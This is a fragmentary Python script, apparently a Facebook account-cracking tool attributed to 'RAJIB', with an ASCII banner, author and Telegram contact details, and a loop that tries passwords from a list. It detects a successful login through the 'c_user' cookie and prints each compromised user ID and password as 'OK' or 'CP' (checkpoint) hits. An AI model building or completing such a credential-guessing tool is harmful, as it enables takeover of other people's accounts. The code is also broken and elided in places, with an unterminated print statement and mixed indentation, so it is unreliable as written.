...
'''
this is an open source program by RAJIB (RAJIBvau)
...
def banner():
   ...
   print("%s     ░╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝                "%(X))
	...
	print("%s
    print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %sMV RAJIB                    %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/RAJIBvau  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/RAJIBvau       %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [RAJIB-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [RAJIB-CP] '+uidx+' | '+pasw+'\033[0;97m')
